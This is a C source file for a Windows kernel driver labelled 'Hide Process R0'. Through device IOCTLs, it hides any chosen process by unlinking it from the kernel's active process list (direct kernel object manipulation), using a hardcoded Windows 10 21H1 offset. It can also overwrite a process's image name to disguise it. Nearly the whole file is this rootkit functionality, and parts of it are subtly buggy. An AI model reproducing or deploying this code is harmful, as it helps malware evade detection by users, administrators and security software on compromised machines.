#include "header.h"

VOID DriverUnload(PDRIVER_OBJECT pDriver)
{

    UNICODE_STRING uSymbolName = {0};

    if (pDriver->DeviceObject != NULL) {
        IoDeleteDevice(pDriver->DeviceObject);
        RtlInitUnicodeString(&uSymbolName, SYMBOL_NAME);
        IoDeleteSymbolicLink(&uSymbolName);
    }

    kprintf("[+ Hide Process R0] Unload the driver.\r\n");
}

NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING path)
{

    NTSTATUS       status;
    PDEVICE_OBJECT pDevice;
    UNICODE_STRING uDeviceName = {0};
    UNICODE_STRING uSymbolName = {0};

    pDriver->DriverUnload = DriverUnload;
    RtlInitUnicodeString(&uDeviceName, DEVICE_NAME);
    status = IoCreateDevice(
        pDriver, 0, &uDeviceName, FILE_DEVICE_UNKNOWN, 0, TRUE, &pDevice);

    if (NT_SUCCESS(status) == FALSE) {
        kprintf("[! Hide Process] Create device Failed: %x.\r\n", status);
        return status;
    }

    // 创建设备成功，创建符号链接
    RtlInitUnicodeString(&uSymbolName, SYMBOL_NAME);
    status = IoCreateSymbolicLink(&uSymbolName, &uDeviceName);

    if (NT_SUCCESS(status) == FALSE) {
        kprintf("[! Hide Process R0] Create symbol link Failed: %x.\r\n",
                status);
        IoDeleteDevice(&uDeviceName);
        return status;
    }

    pDevice->Flags |= DO_BUFFERED_IO;
    pDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = CustomControl;
    pDriver->MajorFunction[IRP_MJ_CREATE]         = CustomCreate;

    return STATUS_SUCCESS;
}

/// @brief 隐藏指定进程
/// @param pid 需要隐藏的进程Pid
/// @return 如果隐藏成功则返回STATUS_SUCCESS，失败则返回STATUS_UNSUCCESSFUL
NTSTATUS HideProcessByPid(UINT64 pid)
{
    UINT64        uProcessId;
    PEPROCESS     pEprocess, pCurProcess;
    PLIST_ENTRY64 pActiveProcessLinks;
    PLIST_ENTRY64 pCurNode;

    pEprocess = PsGetCurrentProcess();
    pActiveProcessLinks =
        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);

    for (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
         pCurNode->Flink != pBeginNode;
         pCurNode = pCurNode->Flink) {
        pCurProcess =
            (PEPROCESS)((PCHAR)pCurNode -
                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
        uProcessId = PsGetProcessId(pCurProcess);
        kprintf("[+] pid => {%#llx}\r\n.", uProcessId);
        if (uProcessId == pid) {
            kprintf(
                "[+ Hide Process R0] Found the Object Process id: %#llx.\r\n",
                uProcessId);
            ((PLIST_ENTRY64)pCurNode->Blink)->Flink = pCurNode->Flink;
            ((PLIST_ENTRY64)pCurNode->Flink)->Blink = pCurNode->Blink;

            return STATUS_SUCCESS;
        }
    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS SetImageName(PSET_IMAGE_NAME pSetImageName)
{
    PEPROCESS     pEprocess, pCurProcess;
    PUCHAR        pOldImageName;
    SIZE_T        len;
    PLIST_ENTRY64 pActiveProcessLinks;
    PLIST_ENTRY64 pCurNode;
    UINT64        uProcessId;

    pEprocess = PsGetCurrentProcess();
    len = strlen(pSetImageName->bImageName);
    pActiveProcessLinks =
        ((PCHAR)pEprocess + WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);

    for (PLIST_ENTRY64 pBeginNode = pActiveProcessLinks, pCurNode = pBeginNode;
         pCurNode->Flink != pBeginNode;
         pCurNode = pCurNode->Flink) {
        pCurProcess =
            (PEPROCESS)((PCHAR)pCurNode -
                        WIN10_21H1_EPROCESS_TO_ACTIVEPROCESSLINKS_OFFSET);
        uProcessId = PsGetProcessId(pCurProcess);
        if (uProcessId == pSetImageName->pid) {
            // copy new string to cover the old string

            kprintf("[+ Hide Process R0] found the process pid\r\n", uProcessId);
            pOldImageName = PsGetProcessImageFileName(pCurProcess);
            RtlCopyMemory(pOldImageName, pSetImageName->bImageName, len);

            return STATUS_SUCCESS;
        }
    }

    return STATUS_UNSUCCESSFUL;
}

NTSTATUS CustomControl(PDEVICE_OBJECT pDevice, PIRP pIrp)
{
    PIO_STACK_LOCATION pstack;
    UINT64             iocode, in_len, out_len, ioinfo, pid;
    NTSTATUS           status;
    PSET_IMAGE_NAME    data;

    status  = STATUS_SUCCESS;
    pstack  = IoGetCurrentIrpStackLocation(pIrp);
    iocode  = pstack->Parameters.DeviceIoControl.IoControlCode;
    in_len  = pstack->Parameters.DeviceIoControl.InputBufferLength;
    out_len = pstack->Parameters.DeviceIoControl.OutputBufferLength;

    switch (iocode) {
    case IOCTL_HIDE_BY_PID:
        pid = *(PUINT32)pIrp->AssociatedIrp.SystemBuffer;
        kprintf("[+ Hide Process R0] Recv %#llx from R3.\r\n", pid);
        status = HideProcessByPid(pid);
        if (!NT_SUCCESS(status)) {
            kprintf("[! Hide Process R0] Hide Process failed.\r\n");
        }
        ioinfo = 0;
        break;
    case IOCTL_SET_IMAGE_NAME:
        data   = (PSET_IMAGE_NAME)pIrp->AssociatedIrp.SystemBuffer;
        status = SetImageName(data);
        if (!NT_SUCCESS(status)) {
            kprintf("Set iamge name to process %llx failed.\r\n", data->pid);
        }
        ioinfo = 0;
        break;
    default:
        kprintf("[! Hide Process]Recv iocode: %#llx", iocode);
        status = STATUS_UNSUCCESSFUL;
        ioinfo = 0;
        break;
    }

    pIrp->IoStatus.Status      = status;
    pIrp->IoStatus.Information = ioinfo;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return STATUS_SUCCESS;
}

NTSTATUS CustomCreate(PDEVICE_OBJECT pDevice, PIRP pIrp)
{
    NTSTATUS status;

    status = STATUS_SUCCESS;
    kprintf("Hide Process R0 has been created.\r\n");
    pIrp->IoStatus.Status      = status;
    pIrp->IoStatus.Information = 0;
    IoCompleteRequest(pIrp, IO_NO_INCREMENT);

    return status;
}